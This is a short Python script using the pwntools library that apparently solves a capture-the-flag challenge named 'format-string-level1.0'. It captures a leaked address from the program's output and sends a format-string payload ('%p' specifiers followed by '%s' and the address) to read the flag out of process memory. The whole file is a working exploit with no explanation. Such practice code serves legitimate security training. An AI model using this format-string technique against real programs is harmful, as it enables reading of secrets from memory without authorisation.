#!/usr/bin/python

import os
import pwn

def readlines(proc):
    try:
        line = proc.recvline(timeout=0.1)
        while (len(line) != 0):
            print(line.decode(), end='')
            line = proc.recvline(timeout=0.1)
    except:
        pass


proc = pwn.process("/challenge/format-string-level1.0")
print(proc.recvline())
print(proc.recvline())
print(proc.recvline())
print(proc.recvline())
print(proc.recvline())

flag_addr = proc.recvline()[0:6] + bytes(2)
print(flag_addr)

readlines(proc)
payload1 = b"noxke"
print(payload1)
proc.sendline(payload1)
readlines(proc)

    # rsi rdx rcx r8 r9 [esp] [esp-8] [esp-0xc] <- flag_addr
payload = b'%p%p%p%p%p%p%p%s' + flag_addr
print(payload)
proc.send_raw(payload)
readlines(proc)